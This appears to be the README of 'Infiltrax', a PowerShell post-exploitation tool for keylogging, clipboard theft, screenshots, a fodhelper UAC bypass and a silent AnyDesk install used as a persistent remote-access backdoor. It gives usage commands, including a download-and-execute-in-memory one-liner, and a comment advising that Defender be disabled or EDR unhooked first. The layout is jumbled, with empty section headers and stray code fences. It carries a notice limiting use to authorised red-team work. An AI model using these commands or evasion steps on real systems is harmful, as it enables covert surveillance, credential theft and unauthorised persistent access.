
    This function is taken from https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692 all credit goes to netbiosX :). Spawnning cmd.exe or powersell.exe from script gets caught by behavioural 
    detection disable defender or unhook EDR first.
![Infiltrax](https://raw.githubusercontent.com/alexdhital/Infiltrax/main/usage.gif)
# Infiltrax
## Features
## Usage
## Warning and Legal Notice
- **AnyDesk Installation**: Install and configure AnyDesk with unattended access.
- **Clipboard Retrieval**: Access the current clipboard contents.
- **Keystroke Logging**: Record keystrokes for a specified duration.
- **Screenshot Capture**: Take screenshots of the entire screen and save them as PNG files.
- **UAC Bypass**: Bypasses UAC via fodhelper.exe
1. **Execute directly into memory**
2. **Get Clipboard contents**
3. **Take desktop screenshot and save into certain location**
4. **Capture user keystrokes and save in a file**
5. **Bypass UAC to run any program in elevated context. Default program powershell.exe**
6. **Installs anydesk silently, sets up unattended access and gets remote id** (Requires Administrative Privilege)
C:\Users\Administrator\Desktop> IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/alexdhital/Infiltrax/main/Infiltrax.ps1')
C:\Users\Administrator\Desktop> Invoke-AnyDeskInstall -InstallPath "C:\Users\Alex\AppData\Local\AnyDesk" -Password "Unattended123!" 
C:\Users\Administrator\Desktop> Invoke-Clipboard
C:\Users\Administrator\Desktop> Invoke-KeyStrokeCapture -DurationInSeconds 30 -OutputPath C:\Users\Vlex\Desktop\keystrokes.txt
C:\Users\Administrator\Desktop> Invoke-Screenshot -Path "C:\Windows\Tasks\"
C:\Users\Vlex\Desktop> Invoke-FodHelperBypass -program "calc.exe"
Infiltrax is a post-exploitation reconnaissance tool for penetration testers and red teams, designed to capture screenshots, retrieve clipboard contents, log keystrokes, bypass UAC and install AnyDesk for persistent remote access.
This tool is intended solely for use by penetration testers and red team professionals during authorized engagements during post exploitation. Do not use this tool for unauthorized access or illegal activities.
```
```powershell
